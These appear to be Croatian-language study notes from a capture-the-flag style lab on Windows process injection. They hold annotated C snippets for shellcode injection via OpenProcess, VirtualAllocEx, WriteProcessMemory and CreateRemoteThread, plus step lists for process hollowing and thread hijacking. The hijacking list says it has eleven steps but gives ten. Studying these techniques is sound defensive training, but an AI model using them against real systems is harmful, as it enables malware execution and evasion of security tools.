Cjelina: Abusing Processes
Aplikacije koje se vrte na tvom OS-u se sadrze od 1 ili vise procesa. 
Postoje nekoliko vrsta process injectiona:
Process Hollowing
Thread Execution Hijacking
Dynamic-link Library Injection
Portable Executable Injection

Shellcode injection se moze podjeliti u 4 koraka:

1. Open a target process with all access rights.
2. Allocate target process memory for the shellcode.
3. Write shellcode to allocated memory in the target process.
4. Execute the shellcode using a remote thread.

Ukratko o svakome koraku:

1.
Otvaramo zeljeni proces preko parametara:
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);
Preko ovoga koda otvaramo proces preko danih argumenata, u nasem slucaju je to pid

2.
U drugome koraku alociramo memoriju velicine shellcoda koji saljemo.
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

3.
U trecem korako koristimo alociranu memorijsku regiju kako bi zapisali nas shellcode.
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);

4.
U cetvrtom koraku imamo kontrolu nad procesorm i nas kod je zapisan u memoriju. Kako bi izvrsili kod koji je u memoriji koristimo CreateRemoteThread
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);

Za vjezbu pronalazimo proces koji je pokrenuo nas korisnik.
Get-Process -IncludeUserName | Where-Object { $_.UserName -match "THM-Attacker" } //potrene admin privilegije za -IncludeUserName flag

Cjelina: Expanding Process Abuse
U prošloj cjelini smo injectali shellcode u aplikaciju, no mozemo injectirati i cijelu datoteku u proces.
To se zove Process Hollowing
Procedura se vrši preko koraka:

Create a target process in a suspended state.
Open a malicious image.
Un-map legitimate code from process memory.
Allocate memory locations for malicious code and write each section into the address space.
Set an entry point for the malicious code.
Take the target process out of a suspended state.

Kodovi za exploite se nalaze u /skripte

Cjelina: Abusing Process Components
Hijacking se moze opisati preko 11 koraka:

Locate and open a target process to control.
Allocate memory region for malicious code.
Write malicious code to allocated memory.
Identify the thread ID of the target thread to hijack.
Open the target thread.
Suspend the target thread.
Obtain the thread context.
Update the instruction pointer to the malicious code.
Rewrite the target thread context.
Resume the hijacked thread.
